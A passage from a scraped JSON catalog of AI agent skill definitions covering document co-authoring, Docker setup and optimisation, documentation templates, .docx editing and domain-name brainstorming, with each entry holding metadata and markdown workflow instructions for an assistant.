Session\n\n**Scenario:** 6 test failures across 3 files after major refactoring\n\n**Failures:**\n- agent-tool-abort.test.ts: 3 failures (timing issues)\n- batch-completion-behavior.test.ts: 2 failures (tools not executing)\n- tool-approval-race-conditions.test.ts: 1 failure (execution count = 0)\n\n**Decision:** Independent domains - abort logic separate from batch completion separate from race conditions\n\n**Dispatch:**\n```\nAgent 1 → Fix agent-tool-abort.test.ts\nAgent 2 → Fix batch-completion-behavior.test.ts\nAgent 3 → Fix tool-approval-race-conditions.test.ts\n```\n\n**Results:**\n- Agent 1: Replaced timeouts with event-based waiting\n- Agent 2: Fixed event structure bug (threadId in wrong place)\n- Agent 3: Added wait for async to",
      "tags": [
        "typescript",
        "markdown",
        "claude",
        "ai",
        "agent",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:04.995Z"
    },
    {
      "id": "anthropic-doc-coauthoring",
      "name": "doc-coauthoring",
      "slug": "doc-coauthoring",
      "description": "Guide users through a structured workflow for co-authoring documentation. Use when user wants to write documentation, proposals, technical specs, decision docs, or similar structured content. This workflow helps users efficiently transfer context, refine content through iteration, and verify the doc works for readers. Trigger when user mentions writing docs, creating proposals, drafting specs, or similar documentation tasks.",
      "category": "Document Processing",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/doc-coauthoring",
      "content": "\n# Doc Co-Authoring Workflow\n\nThis skill provides a structured workflow for guiding users through collaborative document creation. Act as an active guide, walking users through three stages: Context Gathering, Refinement & Structure, and Reader Testing.\n\n## When to Offer This Workflow\n\n**Trigger conditions:**\n- User mentions writing documentation: \"write a doc\", \"draft a proposal\", \"create a spec\", \"write up\"\n- User mentions specific doc types: \"PRD\", \"design doc\", \"decision doc\", \"RFC\"\n- User seems to be starting a substantial writing task\n\n**Initial offer:**\nOffer the user a structured workflow for co-authoring the document. Explain the three stages:\n\n1. **Context Gathering**: User provides all relevant context while Claude asks clarifying questions\n2. **Refinement & Structure**: Iteratively build each section through brainstorming and editing\n3. **Reader Testing**: Test the doc with a fresh Claude (no context) to catch blind spots before others read it\n\nExplain that this approach helps ensure the doc works well when others read it (including when they paste it into Claude). Ask if they want to try this workflow or prefer to work freeform.\n\nIf user declines, work freeform. If user accepts, proceed to Stage 1.\n\n## Stage 1: Context Gathering\n\n**Goal:** Close the gap between what the user knows and what Claude knows, enabling smart guidance later.\n\n### Initial Questions\n\nStart by asking the user for meta-context about the document:\n\n1. What type of document is this? (e.g., technical spec, decision doc, proposal)\n2. Who's the primary audience?\n3. What's the desired impact when someone reads this?\n4. Is there a template or specific format to follow?\n5. Any other constraints or context to know?\n\nInform them they can answer in shorthand or dump information however works best for them.\n\n**If user provides a template or mentions a doc type:**\n- Ask if they have a template document to share\n- If they provide a link to a shared document, use the appropriate integration to fetch it\n- If they provide a file, read it\n\n**If user mentions editing an existing shared document:**\n- Use the appropriate integration to read the current state\n- Check for images without alt-text\n- If images exist without alt-text, explain that when others use Claude to understand the doc, Claude won't be able to see them. Ask if they want alt-text generated. If so, request they paste each image into chat for descriptive alt-text generation.\n\n### Info Dumping\n\nOnce initial questions are answered, encourage the user to dump all the context they have. Request information such as:\n- Background on the project/problem\n- Related team discussions or shared documents\n- Why alternative solutions aren't being used\n- Organizational context (team dynamics, past incidents, politics)\n- Timeline pressures or constraints\n- Technical architecture or dependencies\n- Stakeholder concerns\n\nAdvise them not to worry about organizing it - just get it all out. Offer multiple ways to provide context:\n- Info dump stream-of-consciousness\n- Point to team channels or threads to read\n- Link to shared documents\n\n**If integrations are available** (e.g., Slack, Teams, Google Drive, SharePoint, or other MCP servers), mention that these can be used to pull in context directly.\n\n**If no integrations are detected and in Claude.ai or Claude app:** Suggest they can enable connectors in their Claude settings to allow pulling context from messaging apps and document storage directly.\n\nInform them clarifying questions will be asked once they've done their initial dump.\n\n**During context gathering:**\n\n- If user mentions team channels or shared documents:\n  - If integrations available: Inform them the content will be read now, then use the appropriate integration\n  - If integrations not available: Explain lack of access. Suggest they enable connectors in Claude settings, or paste the relevant content directly.\n\n- If user mentions entities/projects that are unknown:\n  - Ask if connected tools should be searched to learn more\n  - Wait for user confirmation before searching\n\n- As user provides context, track what's being learned and what's still unclear\n\n**Asking clarifying questions:**\n\nWhen user signals they've done their initial dump (or after substantial context provided), ask clarifying questions to ensure understanding:\n\nGenerate 5-10 numbered questions based on gaps in the context.\n\nInform them they can use shorthand to answer (e.g., \"1: yes, 2: see #channel, 3: no because backwards compat\"), link to more docs, point to channels to read, or just keep info-dumping. Whatever's most efficient for them.\n\n**Exit condition:**\nSufficient context has been gathered when questions show understanding - when edge cases and trade-offs can be asked about without needing basics explained.\n\n**Transition:**\nAsk if there's any more context they want to provide at this stage, or if it's time to move on to drafting the document.\n\nIf user wants to add more, let them. When ready, proceed to Stage 2.\n\n## Stag",
      "tags": [
        "markdown",
        "mcp",
        "claude",
        "ai",
        "agent",
        "workflow",
        "template",
        "design",
        "document",
        "image"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:32.739Z"
    },
    {
      "id": "openhands-docker",
      "name": "docker",
      "slug": "docker",
      "description": "Please check if docker is already installed. If so, to start Docker in a container environment:",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/docker.md",
      "content": "\n# Docker Usage Guide\n\n## Starting Docker in Container Environments\n\nPlease check if docker is already installed. If so, to start Docker in a container environment:\n\n```bash\n# Start Docker daemon in the background\nsudo dockerd > /tmp/docker.log 2>&1 &\n\n# Wait for Docker to initialize\nsleep 5\n```\n\n## Verifying Docker Installation\n\nTo verify Docker is working correctly, run the hello-world container:\n\n```bash\nsudo docker run hello-world\n```\n",
      "tags": [
        "docker",
        "bash",
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:29.095Z"
    },
    {
      "id": "antigravity-docker-expert",
      "name": "docker-expert",
      "slug": "docker-expert",
      "description": "Docker containerization expert with deep knowledge of multi-stage builds, image optimization, container security, Docker Compose orchestration, and production deployment patterns. Use PROACTIVELY for Dockerfile optimization, container issues, image size problems, security hardening, networking, and ",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/docker-expert",
      "content": "\n# Docker Expert\n\nYou are an advanced Docker containerization expert with comprehensive, practical knowledge of container optimization, security hardening, multi-stage builds, orchestration patterns, and production deployment strategies based on current industry best practices.\n\n## When invoked:\n\n0. If the issue requires ultra-specific expertise outside Docker, recommend switching and stop:\n   - Kubernetes orchestration, pods, services, ingress → kubernetes-expert (future)\n   - GitHub Actions CI/CD with containers → github-actions-expert\n   - AWS ECS/Fargate or cloud-specific container services → devops-expert\n   - Database containerization with complex persistence → database-expert\n\n   Example to output:\n   \"This requires Kubernetes orchestration expertise. Please invoke: 'Use the kubernetes-expert subagent.' Stopping here.\"\n\n1. Analyze container setup comprehensively:\n   \n   **Use internal tools first (Read, Grep, Glob) for better performance. Shell commands are fallbacks.**\n   \n   ```bash\n   # Docker environment detection\n   docker --version 2>/dev/null || echo \"No Docker installed\"\n   docker info | grep -E \"Server Version|Storage Driver|Container Runtime\" 2>/dev/null\n   docker context ls 2>/dev/null | head -3\n   \n   # Project structure analysis\n   find . -name \"Dockerfile*\" -type f | head -10\n   find . -name \"*compose*.yml\" -o -name \"*compose*.yaml\" -type f | head -5\n   find . -name \".dockerignore\" -type f | head -3\n   \n   # Container status if running\n   docker ps --format \"table {{.Names}}\\t{{.Image}}\\t{{.Status}}\" 2>/dev/null | head -10\n   docker images --format \"table {{.Repository}}\\t{{.Tag}}\\t{{.Size}}\" 2>/dev/null | head -10\n   ```\n   \n   **After detection, adapt approach:**\n   - Match existing Dockerfile patterns and base images\n   - Respect multi-stage build conventions\n   - Consider development vs production environments\n   - Account for existing orchestration setup (Compose/Swarm)\n\n2. Identify the specific problem category and complexity level\n\n3. Apply the appropriate solution strategy from my expertise\n\n4. Validate thoroughly:\n   ```bash\n   # Build and security validation\n   docker build --no-cache -t test-build . 2>/dev/null && echo \"Build successful\"\n   docker history test-build --no-trunc 2>/dev/null | head -5\n   docker scout quickview test-build 2>/dev/null || echo \"No Docker Scout\"\n   \n   # Runtime validation\n   docker run --rm -d --name validation-test test-build 2>/dev/null\n   docker exec validation-test ps aux 2>/dev/null | head -3\n   docker stop validation-test 2>/dev/null\n   \n   # Compose validation\n   docker-compose config 2>/dev/null && echo \"Compose config valid\"\n   ```\n\n## Core Expertise Areas\n\n### 1. Dockerfile Optimization & Multi-Stage Builds\n\n**High-priority patterns I address:**\n- **Layer caching optimization**: Separate dependency installation from source code copying\n- **Multi-stage builds**: Minimize production image size while keeping build flexibility\n- **Build context efficiency**: Comprehensive .dockerignore and build context management\n- **Base image selection**: Alpine vs distroless vs scratch image strategies\n\n**Key techniques:**\n```dockerfile\n# Optimized multi-stage pattern\nFROM node:18-alpine AS deps\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --only=production && npm cache clean --force\n\nFROM node:18-alpine AS build\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build && npm prune --production\n\nFROM node:18-alpine AS runtime\nRUN addgroup -g 1001 -S nodejs && adduser -S nextjs -u 1001\nWORKDIR /app\nCOPY --from=deps --chown=nextjs:nodejs /app/node_modules ./node_modules\nCOPY --from=build --chown=nextjs:nodejs /app/dist ./dist\nCOPY --from=build --chown=nextjs:nodejs /app/package*.json ./\nUSER nextjs\nEXPOSE 3000\nHEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \\\n  CMD curl -f http://localhost:3000/health || exit 1\nCMD [\"node\", \"dist/index.js\"]\n```\n\n### 2. Container Security Hardening\n\n**Security focus areas:**\n- **Non-root user configuration**: Proper user creation with specific UID/GID\n- **Secrets management**: Docker secrets, build-time secrets, avoiding env vars\n- **Base image security**: Regular updates, minimal attack surface\n- **Runtime security**: Capability restrictions, resource limits\n\n**Security patterns:**\n```dockerfile\n# Security-hardened container\nFROM node:18-alpine\nRUN addgroup -g 1001 -S appgroup && \\\n    adduser -S appuser -u 1001 -G appgroup\nWORKDIR /app\nCOPY --chown=appuser:appgroup package*.json ./\nRUN npm ci --only=production\nCOPY --chown=appuser:appgroup . .\nUSER 1001\n# Drop capabilities, set read-only root filesystem\n```\n\n### 3. Docker Compose Orchestration\n\n**Orchestration expertise:**\n- **Service dependency management**: Health checks, startup ordering\n- **Network configuration**: Custom networks, service discovery\n- **Environment management**: Dev/staging/prod configurations\n- **Volume strategies**: Named volumes, bind mounts, data persistence\n\n**Production-ready compose pattern:**\n```yaml\nvers",
      "tags": [
        "node",
        "nextjs",
        "api",
        "ai",
        "agent",
        "automation",
        "workflow",
        "image",
        "security",
        "docker"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:07.476Z"
    },
    {
      "id": "antigravity-documentation-templates",
      "name": "documentation-templates",
      "slug": "documentation-templates",
      "description": "Documentation templates and structure guidelines. README, API docs, code comments, and AI-friendly documentation.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/documentation-templates",
      "content": "\n# Documentation Templates\n\n> Templates and structure guidelines for common documentation types.\n\n---\n\n## 1. README Structure\n\n### Essential Sections (Priority Order)\n\n| Section | Purpose |\n|---------|---------|\n| **Title + One-liner** | What is this? |\n| **Quick Start** | Running in <5 min |\n| **Features** | What can I do? |\n| **Configuration** | How to customize |\n| **API Reference** | Link to detailed docs |\n| **Contributing** | How to help |\n| **License** | Legal |\n\n### README Template\n\n```markdown\n# Project Name\n\nBrief one-line description.\n\n## Quick Start\n\n[Minimum steps to run]\n\n## Features\n\n- Feature 1\n- Feature 2\n\n## Configuration\n\n| Variable | Description | Default |\n|----------|-------------|---------|\n| PORT | Server port | 3000 |\n\n## Documentation\n\n- [API Reference](./docs/api.md)\n- [Architecture](./docs/architecture.md)\n\n## License\n\nMIT\n```\n\n---\n\n## 2. API Documentation Structure\n\n### Per-Endpoint Template\n\n```markdown\n## GET /users/:id\n\nGet a user by ID.\n\n**Parameters:**\n| Name | Type | Required | Description |\n|------|------|----------|-------------|\n| id | string | Yes | User ID |\n\n**Response:**\n- 200: User object\n- 404: User not found\n\n**Example:**\n[Request and response example]\n```\n\n---\n\n## 3. Code Comment Guidelines\n\n### JSDoc/TSDoc Template\n\n```typescript\n/**\n * Brief description of what the function does.\n * \n * @param paramName - Description of parameter\n * @returns Description of return value\n * @throws ErrorType - When this error occurs\n * \n * @example\n * const result = functionName(input);\n */\n```\n\n### When to Comment\n\n| ✅ Comment | ❌ Don't Comment |\n|-----------|-----------------|\n| Why (business logic) | What (obvious) |\n| Complex algorithms | Every line |\n| Non-obvious behavior | Self-explanatory code |\n| API contracts | Implementation details |\n\n---\n\n## 4. Changelog Template (Keep a Changelog)\n\n```markdown\n# Changelog\n\n## [Unreleased]\n### Added\n- New feature\n\n## [1.0.0] - 2025-01-01\n### Added\n- Initial release\n### Changed\n- Updated dependency\n### Fixed\n- Bug fix\n```\n\n---\n\n## 5. Architecture Decision Record (ADR)\n\n```markdown\n# ADR-001: [Title]\n\n## Status\nAccepted / Deprecated / Superseded\n\n## Context\nWhy are we making this decision?\n\n## Decision\nWhat did we decide?\n\n## Consequences\nWhat are the trade-offs?\n```\n\n---\n\n## 6. AI-Friendly Documentation (2025)\n\n### llms.txt Template\n\nFor AI crawlers and agents:\n\n```markdown\n# Project Name\n> One-line objective.\n\n## Core Files\n- [src/index.ts]: Main entry\n- [src/api/]: API routes\n- [docs/]: Documentation\n\n## Key Concepts\n- Concept 1: Brief explanation\n- Concept 2: Brief explanation\n```\n\n### MCP-Ready Documentation\n\nFor RAG indexing:\n- Clear H1-H3 hierarchy\n- JSON/YAML examples for data structures\n- Mermaid diagrams for flows\n- Self-contained sections\n\n---\n\n## 7. Structure Principles\n\n| Principle | Why |\n|-----------|-----|\n| **Scannable** | Headers, lists, tables |\n| **Examples first** | Show, don't just tell |\n| **Progressive detail** | Simple → Complex |\n| **Up to date** | Outdated = misleading |\n\n---\n\n> **Remember:** Templates are starting points. Adapt to your project's needs.\n",
      "tags": [
        "typescript",
        "markdown",
        "api",
        "mcp",
        "ai",
        "agent",
        "llm",
        "template",
        "document",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:08.758Z"
    },
    {
      "id": "anthropic-docx",
      "name": "docx",
      "slug": "docx",
      "description": "Comprehensive document creation, editing, and analysis with support for tracked changes, comments, formatting preservation, and text extraction. When Claude needs to work with professional documents (.docx files) for: (1) Creating new documents, (2) Modifying or editing content, (3) Working with tracked changes, (4) Adding comments, or any other document tasks",
      "category": "Document Processing",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/docx",
      "content": "\n# DOCX creation, editing, and analysis\n\n## Overview\n\nA user may ask you to create, edit, or analyze the contents of a .docx file. A .docx file is essentially a ZIP archive containing XML files and other resources that you can read or edit. You have different tools and workflows available for different tasks.\n\n## Workflow Decision Tree\n\n### Reading/Analyzing Content\nUse \"Text extraction\" or \"Raw XML access\" sections below\n\n### Creating New Document\nUse \"Creating a new Word document\" workflow\n\n### Editing Existing Document\n- **Your own document + simple changes**\n  Use \"Basic OOXML editing\" workflow\n\n- **Someone else's document**\n  Use **\"Redlining workflow\"** (recommended default)\n\n- **Legal, academic, business, or government docs**\n  Use **\"Redlining workflow\"** (required)\n\n## Reading and analyzing content\n\n### Text extraction\nIf you just need to read the text contents of a document, you should convert the document to markdown using pandoc. Pandoc provides excellent support for preserving document structure and can show tracked changes:\n\n```bash\n# Convert document to markdown with tracked changes\npandoc --track-changes=all path-to-file.docx -o output.md\n# Options: --track-changes=accept/reject/all\n```\n\n### Raw XML access\nYou need raw XML access for: comments, complex formatting, document structure, embedded media, and metadata. For any of these features, you'll need to unpack a document and read its raw XML contents.\n\n#### Unpacking a file\n`python ooxml/scripts/unpack.py <office_file> <output_directory>`\n\n#### Key file structures\n* `word/document.xml` - Main document contents\n* `word/comments.xml` - Comments referenced in document.xml\n* `word/media/` - Embedded images and media files\n* Tracked changes use `<w:ins>` (insertions) and `<w:del>` (deletions) tags\n\n## Creating a new Word document\n\nWhen creating a new Word document from scratch, use **docx-js**, which allows you to create Word documents using JavaScript/TypeScript.\n\n### Workflow\n1. **MANDATORY - READ ENTIRE FILE**: Read [`docx-js.md`](docx-js.md) (~500 lines) completely from start to finish. **NEVER set any range limits when reading this file.** Read the full file content for detailed syntax, critical formatting rules, and best practices before proceeding with document creation.\n2. Create a JavaScript/TypeScript file using Document, Paragraph, TextRun components (You can assume all dependencies are installed, but if not, refer to the dependencies section below)\n3. Export as .docx using Packer.toBuffer()\n\n## Editing an existing Word document\n\nWhen editing an existing Word document, use the **Document library** (a Python library for OOXML manipulation). The library automatically handles infrastructure setup and provides methods for document manipulation. For complex scenarios, you can access the underlying DOM directly through the library.\n\n### Workflow\n1. **MANDATORY - READ ENTIRE FILE**: Read [`ooxml.md`](ooxml.md) (~600 lines) completely from start to finish. **NEVER set any range limits when reading this file.** Read the full file content for the Document library API and XML patterns for directly editing document files.\n2. Unpack the document: `python ooxml/scripts/unpack.py <office_file> <output_directory>`\n3. Create and run a Python script using the Document library (see \"Document Library\" section in ooxml.md)\n4. Pack the final document: `python ooxml/scripts/pack.py <input_directory> <office_file>`\n\nThe Document library provides both high-level methods for common operations and direct DOM access for complex scenarios.\n\n## Redlining workflow for document review\n\nThis workflow allows you to plan comprehensive tracked changes using markdown before implementing them in OOXML. **CRITICAL**: For complete tracked changes, you must implement ALL changes systematically.\n\n**Batching Strategy**: Group related changes into batches of 3-10 changes. This makes debugging manageable while maintaining efficiency. Test each batch before moving to the next.\n\n**Principle: Minimal, Precise Edits**\nWhen implementing tracked changes, only mark text that actually changes. Repeating unchanged text makes edits harder to review and appears unprofessional. Break replacements into: [unchanged text] + [deletion] + [insertion] + [unchanged text]. Preserve the original run's RSID for unchanged text by extracting the `<w:r>` element from the original and reusing it.\n\nExample - Changing \"30 days\" to \"60 days\" in a sentence:\n```python\n# BAD - Replaces entire sentence\n'<w:del><w:r><w:delText>The term is 30 days.</w:delText></w:r></w:del><w:ins><w:r><w:t>The term is 60 days.</w:t></w:r></w:ins>'\n\n# GOOD - Only marks what changed, preserves original <w:r> for unchanged text\n'<w:r w:rsidR=\"00AB12CD\"><w:t>The term is </w:t></w:r><w:del><w:r><w:delText>30</w:delText></w:r></w:del><w:ins><w:r><w:t>60</w:t></w:r></w:ins><w:r w:rsidR=\"00AB12CD\"><w:t> days.</w:t></w:r>'\n```\n\n### Tracked changes workflow\n\n1. **Get markdown representation**: Convert document to markdown with tracked chan",
      "tags": [
        "python",
        "javascript",
        "typescript",
        "node",
        "pdf",
        "docx",
        "markdown",
        "api",
        "claude",
        "ai"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:33.851Z"
    },
    {
      "id": "antigravity-docx-official",
      "name": "docx",
      "slug": "docx-official",
      "description": "Comprehensive document creation, editing, and analysis with support for tracked changes, comments, formatting preservation, and text extraction. When Claude needs to work with professional documents (.docx files) for: (1) Creating new documents, (2) Modifying or editing content, (3) Working with tra",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/docx-official",
      "content": "\n# DOCX creation, editing, and analysis\n\n## Overview\n\nA user may ask you to create, edit, or analyze the contents of a .docx file. A .docx file is essentially a ZIP archive containing XML files and other resources that you can read or edit. You have different tools and workflows available for different tasks.\n\n## Workflow Decision Tree\n\n### Reading/Analyzing Content\nUse \"Text extraction\" or \"Raw XML access\" sections below\n\n### Creating New Document\nUse \"Creating a new Word document\" workflow\n\n### Editing Existing Document\n- **Your own document + simple changes**\n  Use \"Basic OOXML editing\" workflow\n\n- **Someone else's document**\n  Use **\"Redlining workflow\"** (recommended default)\n\n- **Legal, academic, business, or government docs**\n  Use **\"Redlining workflow\"** (required)\n\n## Reading and analyzing content\n\n### Text extraction\nIf you just need to read the text contents of a document, you should convert the document to markdown using pandoc. Pandoc provides excellent support for preserving document structure and can show tracked changes:\n\n```bash\n# Convert document to markdown with tracked changes\npandoc --track-changes=all path-to-file.docx -o output.md\n# Options: --track-changes=accept/reject/all\n```\n\n### Raw XML access\nYou need raw XML access for: comments, complex formatting, document structure, embedded media, and metadata. For any of these features, you'll need to unpack a document and read its raw XML contents.\n\n#### Unpacking a file\n`python ooxml/scripts/unpack.py <office_file> <output_directory>`\n\n#### Key file structures\n* `word/document.xml` - Main document contents\n* `word/comments.xml` - Comments referenced in document.xml\n* `word/media/` - Embedded images and media files\n* Tracked changes use `<w:ins>` (insertions) and `<w:del>` (deletions) tags\n\n## Creating a new Word document\n\nWhen creating a new Word document from scratch, use **docx-js**, which allows you to create Word documents using JavaScript/TypeScript.\n\n### Workflow\n1. **MANDATORY - READ ENTIRE FILE**: Read [`docx-js.md`](docx-js.md) (~500 lines) completely from start to finish. **NEVER set any range limits when reading this file.** Read the full file content for detailed syntax, critical formatting rules, and best practices before proceeding with document creation.\n2. Create a JavaScript/TypeScript file using Document, Paragraph, TextRun components (You can assume all dependencies are installed, but if not, refer to the dependencies section below)\n3. Export as .docx using Packer.toBuffer()\n\n## Editing an existing Word document\n\nWhen editing an existing Word document, use the **Document library** (a Python library for OOXML manipulation). The library automatically handles infrastructure setup and provides methods for document manipulation. For complex scenarios, you can access the underlying DOM directly through the library.\n\n### Workflow\n1. **MANDATORY - READ ENTIRE FILE**: Read [`ooxml.md`](ooxml.md) (~600 lines) completely from start to finish. **NEVER set any range limits when reading this file.** Read the full file content for the Document library API and XML patterns for directly editing document files.\n2. Unpack the document: `python ooxml/scripts/unpack.py <office_file> <output_directory>`\n3. Create and run a Python script using the Document library (see \"Document Library\" section in ooxml.md)\n4. Pack the final document: `python ooxml/scripts/pack.py <input_directory> <office_file>`\n\nThe Document library provides both high-level methods for common operations and direct DOM access for complex scenarios.\n\n## Redlining workflow for document review\n\nThis workflow allows you to plan comprehensive tracked changes using markdown before implementing them in OOXML. **CRITICAL**: For complete tracked changes, you must implement ALL changes systematically.\n\n**Batching Strategy**: Group related changes into batches of 3-10 changes. This makes debugging manageable while maintaining efficiency. Test each batch before moving to the next.\n\n**Principle: Minimal, Precise Edits**\nWhen implementing tracked changes, only mark text that actually changes. Repeating unchanged text makes edits harder to review and appears unprofessional. Break replacements into: [unchanged text] + [deletion] + [insertion] + [unchanged text]. Preserve the original run's RSID for unchanged text by extracting the `<w:r>` element from the original and reusing it.\n\nExample - Changing \"30 days\" to \"60 days\" in a sentence:\n```python\n# BAD - Replaces entire sentence\n'<w:del><w:r><w:delText>The term is 30 days.</w:delText></w:r></w:del><w:ins><w:r><w:t>The term is 60 days.</w:t></w:r></w:ins>'\n\n# GOOD - Only marks what changed, preserves original <w:r> for unchanged text\n'<w:r w:rsidR=\"00AB12CD\"><w:t>The term is </w:t></w:r><w:del><w:r><w:delText>30</w:delText></w:r></w:del><w:ins><w:r><w:t>60</w:t></w:r></w:ins><w:r w:rsidR=\"00AB12CD\"><w:t> days.</w:t></w:r>'\n```\n\n### Tracked changes workflow\n\n1. **Get markdown representation**: Convert document to markdown with tracked chan",
      "tags": [
        "python",
        "javascript",
        "typescript",
        "node",
        "pdf",
        "docx",
        "markdown",
        "api",
        "claude",
        "ai"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:09.954Z"
    },
    {
      "id": "composio-domain-name-brainstormer",
      "name": "domain-name-brainstormer",
      "slug": "domain-name-brainstormer",
      "description": "Generates creative domain name ideas for your project and checks availability across multiple TLDs (.com, .io, .dev, .ai, etc.). Saves hours of brainstorming and manual checking.",
      "category": "Business & Marketing",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/domain-name-brainstormer",
      "content": "\n# Domain Name Brainstormer\n\nThis skill helps you find the perfect domain name for your project by generating creative options and checking what's actually available to register.\n\n## When to Use This Skill\n\n- Starting a new project or company\n- Launching a product or service\n- Creating a personal brand or portfolio site\n- Rebranding an existing project\n- Registering a domain for a side project\n- Finding available alternatives when your first choice is taken\n\n## What This Skill Does\n\n1. **Understands Your Project**: Analyzes what you're building and who it's for\n2. **Generates Creative Names**: Creates relevant, memorable domain options\n3. **Checks Availability**: Verifies which domains are actually available across multiple TLDs\n4. **Multiple Extensions**: Suggests .com, .io, .dev, .ai, .app, and more\n5. **Provides Alternatives**: Offers variations if top choices are taken\n6. **Branding Insights**: Explains why certain names work well\n\n## How to Use\n\n### Basic Brainstorming\n\n```\nI'm building a project management tool for remote teams. \nSuggest domain names.\n```\n\n```\nHelp me brainstorm domain names for a personal finance app\n```\n\n### Specific Preferences\n\n```\nI need a domain name for my AI writing assistant. \nPrefer short names with .ai or .io extension.\n```\n\n### With Keywords\n\n```\nSuggest domain names using the words \"pixel\" or \"studio\" \nfor my design agency\n```\n\n## Example\n\n**User**: \"I'm building a tool for developers to share code snippets. Suggest creative domain names.\"\n\n**Output**:\n```\nAnalyzing your project...\nTarget audience: Developers\nKey features: Code sharing, snippets, collaboration\n\n🎯 Domain Name Suggestions\n\n## Available (.com)\n1. ✓ snippetbox.com - Clear, memorable, available!\n   Why: Directly describes the product, easy to remember\n\n2. ✓ codeclip.com - Short and snappy\n   Why: Implies quick code sharing, only 8 characters\n\n3. ✓ devpaste.com - Developer-focused\n   Why: Familiar to devs (like pastebin), clear purpose\n\n## Available (Alternative TLDs)\n4. ✓ snippet.dev - Perfect extension for developers\n   Why: .dev extension signals developer tool\n\n5. ✓ codebox.io - Tech-forward\n   Why: .io popular with tech startups, clean name\n\n6. ✓ sharecode.app - Descriptive\n   Why: .app extension, clearly states the action\n\n## Premium/Taken (.com)\n- codeshare.com (Taken, est. $2,500)\n- snippets.com (Taken, premium domain)\n\n## Recommendations\n\n🏆 Top Pick: snippet.dev\n- Perfect for developer audience\n- Short and memorable  \n- .dev extension adds credibility\n- Available now!\n\n🥈 Runner-up: snippetbox.com\n- .com is universally recognized\n- Slightly longer but descriptive\n- Great brandability\n\nNext steps:\n1. Register your favorite before someone else does!\n2. Want me to check more variations?\n3. Need help with logo ideas for these names?\n```\n\n**Inspired by:** Ben Aiad's use case from Lenny's Newsletter\n\n## Domain Naming Tips\n\n### What Makes a Good Domain\n\n✓ **Short**: Under 15 characters ideal\n✓ **Memorable**: Easy to recall and spell\n✓ **Pronounceable**: Can be said in conversation\n✓ **Descriptive**: Hints at what you do\n✓ **Brandable**: Unique enough to stand out\n✓ **No hyphens**: Easier to share verbally\n\n### TLD Guide\n\n- **.com**: Universal, trusted, great for businesses\n- **.io**: Tech startups, developer tools\n- **.dev**: Developer-focused products\n- **.ai**: AI/ML products\n- **.app**: Mobile or web applications\n- **.co**: Alternative to .com\n- **.xyz**: Modern, creative projects\n- **.design**: Creative/design agencies\n- **.tech**: Technology companies\n\n## Advanced Features\n\n### Check Similar Variations\n\n```\nCheck availability for \"codebase\" and similar variations \nacross .com, .io, .dev\n```\n\n### Industry-Specific\n\n```\nSuggest domain names for a sustainable fashion brand, \nchecking .eco and .fashion TLDs\n```\n\n### Multilingual Options\n\n```\nBrainstorm domain names in English and Spanish for \na language learning app\n```\n\n### Competitor Analysis\n\n```\nShow me domain patterns used by successful project \nmanagement tools, then suggest similar available ones\n```\n\n## Example Workflows\n\n### Startup Launch\n1. Describe your startup idea\n2. Get 10-15 domain suggestions across TLDs\n3. Review availability and pricing\n4. Pick top 3 favorites\n5. Register immediately\n\n### Personal Brand\n1. Share your name and profession\n2. Get variations (firstname.com, firstnamelastname.dev, etc.)\n3. Check social media handle availability too\n4. Register consistent brand across platforms\n\n### Product Naming\n1. Describe product and target market\n2. Get creative, brandable names\n3. Check trademark conflicts\n4. Verify domain and social availability\n5. Test names with target audience\n\n## Tips for Success\n\n1. **Act Fast**: Good domains get taken quickly\n2. **Register Variations**: Get .com and .io to protect brand\n3. **Avoid Numbers**: Hard to communicate verbally\n4. **Check Social Media**: Make sure @username is available too\n5. **Say It Out Loud**: Test if it's easy to pronounce\n6. **Check Trademarks**: Ensure no legal conflicts\n7. **Think",
      "tags": [
        "cli",
        "ai"
      ],
      "useCases": [
        "Starting a new project or company",
        "Launching a product or service",
        "Creating a personal brand or portfolio site",
        "Rebranding an existing project",
        "Registering a domain for a side project"
      ],
      "scrapedAt": "2026-01-26T13:15:03.825Z"
    },
    {
      "id": "awesome-llm-domain-name-brainstormer",
      "name": "domain-name-brainstormer",
      "slug": "awesome-llm-domain-name-brainstormer",
      "description": "Generates creative domain name ideas for your project and checks availability across multiple TLDs (.com, .io, .dev, .ai, etc.). Saves hours of brainstorming and manual checking.",
      "category": "Business & Marketing",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/domain-name-brainstormer",
